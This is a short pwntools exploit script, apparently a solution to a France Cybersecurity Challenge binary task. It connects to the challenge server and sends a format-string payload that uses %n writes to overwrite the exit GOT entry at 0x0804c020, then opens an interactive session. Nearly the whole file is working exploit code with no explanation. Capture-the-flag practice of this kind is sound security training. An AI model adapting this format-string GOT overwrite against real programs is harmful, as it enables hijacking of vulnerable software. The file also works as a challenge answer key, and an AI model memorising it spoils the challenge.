from pwn import *

#io = process('seguin')
io = remote('challenges2.france-cybersecurity-challenge.fr', 4003)

script='''
tbreak main
b *0x0804928e
c
'''

#pid = gdb.attach(io, gdbscript=script)

exit_got_plt = 0x0804c020

io.recv()

pld = p32(exit_got_plt)
pld += p32(exit_got_plt+2)
pld += b"%37290x"
pld += b"%4$n"
pld += b"%30290x"
pld += b"%5$n"
print(len(pld))

io.sendline(pld)
io.interactive()
